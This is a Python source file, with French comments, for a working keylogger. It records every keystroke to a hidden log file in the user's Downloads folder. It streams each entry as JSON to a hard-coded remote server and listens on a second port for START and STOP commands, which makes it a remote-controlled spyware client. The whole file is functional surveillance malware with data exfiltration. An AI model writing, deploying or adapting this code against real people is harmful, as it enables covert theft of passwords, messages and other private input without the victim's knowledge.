from pynput import keyboard
import datetime
import os
import socket
import json
import time
import threading 

REMOTE_IP = "192.168.30.130" 
REMOTE_PORT = 12345
COMMAND_PORT = 12346  

log = ""
username = os.environ.get("USERNAME")
path = os.path.join(os.environ["USERPROFILE"], "Downloads", f".log_{username}.txt")

# Variable globale pour contrôler l'état d'enregistrement
is_logging = True # <--- Ajout pour le contrôle Start/Sto

# ============================================================
#  ENVOI D'UNE LIGNE JSON AU SERVEUR SOCKET
# ============================================================re des d'un coté et de l'autre 
def send_log_entry(json_entry):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((REMOTE_IP, REMOTE_PORT))
            s.sendall(b"LOG_START:" + json_entry.encode("utf-8"))
    except:
        pass


# ============================================================
#  ENREGISTREMENT LOCAL + ENVOI SOCKET
# ============================================================
def write_current_log_to_file(current_text, key_pressed):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    entry = {
        "timestamp": ts,
        "key": key_pressed,
        "log": current_text
    }

    json_entry = json.dumps(entry)

    with open(path, "a", encoding="utf-8") as f:
        f.write(json_entry + "\n")

    send_log_entry(json_entry)

# ============================================================
#  NOUVELLE FONCTION : ÉCOUTE DES COMMANDES DU SERVEUR
# ============================================================
def command_listener():
    global is_logging
    
    # Tente de maintenir une connexion persistante au serveur
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((REMOTE_IP, COMMAND_PORT))
                print("[CMD] Connecté au serveur de commandes.")
                
                while True:
                    data = s.recv(1024).decode("utf-8").strip()
                    if not data:
                        break # Connexion perdue
                        
                    if data == "STOP":
                        is_logging = False
                        print("[CMD] Commande STOP reçue. Enregistrement suspendu.")
                    elif data == "START":
                        is_logging = True
                        print("[CMD] Commande START reçue. Enregistrement activé.")
                    
        except ConnectionRefusedError:
            # Le serveur n'est pas encore démarré
            time.sleep(5) 
        except Exception as e:
            # Autres erreurs de connexion/socket
            time.sleep(5)
            pass

# ============================================================
#  TRAITEMENT DES TOUCHES (MODIFIÉ)
# ============================================================
def process_keys(key):
    global log
    global is_logging # Utilisez la variable d'état

    if not is_logging: # <--- Si l'enregistrement est suspendu, on ignore les touches.
        if key == keyboard.Key.esc:
            keyboard_listener.stop()
        return

    try:
        char = key.char
        log += char
        key_pressed = char
    except:
        # ... (Logique pour espace, enter, etc. inchangée)
        if key == keyboard.Key.space:
            log += " "
            key_pressed = "SPACE"
        elif key == keyboard.Key.enter:
            log += "\n"
            key_pressed = "ENTER"
        elif key == keyboard.Key.backspace:
            log = log[:-1]
            key_pressed = "BACKSPACE"
        else:
            key_pressed = str(key)
    
    write_current_log_to_file(log, key_pressed)

    if key == keyboard.Key.esc:
        keyboard_listener.stop()


# ============================================================
#  DEMARRAGE DU KEYLOGGER
# ============================================================
threading.Thread(target=command_listener, daemon=True).start()
keyboard_listener = keyboard.Listener(on_press=process_keys)

with keyboard_listener:
    keyboard_listener.join()